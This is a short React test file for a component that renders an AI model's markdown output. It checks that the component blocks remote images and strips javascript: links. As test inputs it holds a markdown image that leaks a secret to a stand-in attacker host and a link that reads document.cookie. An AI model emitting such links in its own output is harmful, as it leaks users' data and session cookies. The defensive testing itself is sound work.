import React from 'react';
import { render, waitFor } from '@testing-library/react';
import { MarkdownMessage } from './MarkdownMessage';

describe('MarkdownMessage', () => {

    it('does not load images from model output unless asked to', async () => {
        const { container } = render(<MarkdownMessage text={'Here ![x](https://attacker.example/?q=secret) done'} />);
        await waitFor(() => expect(container.textContent).toContain('done'));
        expect(container.querySelector('img')).toBeNull();
    });

    it('shows images when they are allowed', async () => {
        const { container } = render(<MarkdownMessage text={'![x](https://example.com/a.png)'} allowImages={true} />);
        await waitFor(() => expect(container.querySelector('img')).not.toBeNull());
    });

    it('drops script links from model output', async () => {
        const { container } = render(<MarkdownMessage text={'[click](javascript:alert(document.cookie))'} />);
        await waitFor(() => expect(container.textContent).toContain('click'));
        expect(container.innerHTML.toLowerCase()).not.toContain('javascript:');
    });
});
